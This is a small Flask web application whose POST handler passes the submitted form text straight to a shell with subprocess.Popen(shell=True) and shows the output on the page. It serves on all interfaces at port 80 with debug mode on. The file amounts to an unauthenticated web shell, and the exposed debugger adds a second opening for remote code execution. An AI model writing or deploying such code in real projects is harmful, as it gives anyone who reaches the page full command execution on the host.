import subprocess

from flask import Flask, request, render_template



app = Flask(__name__)

@app.route('/')
def my_form():
    return render_template('index.html',data="hey")

@app.route('/', methods=['POST'])
def my_form_post():
    text = request.form['text']
    l = subprocess.Popen(text, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()[0]
    p = l.decode('utf-8')
    data = '<p>'+  p + '</p>'
    return render_template('index.html', data=data)
   
 
                                                                                                                                                                                                                                                                       
app.run(debug=True , host="0.0.0.0" , port=80)                                                                                                                                                                                                                                                                                                                          
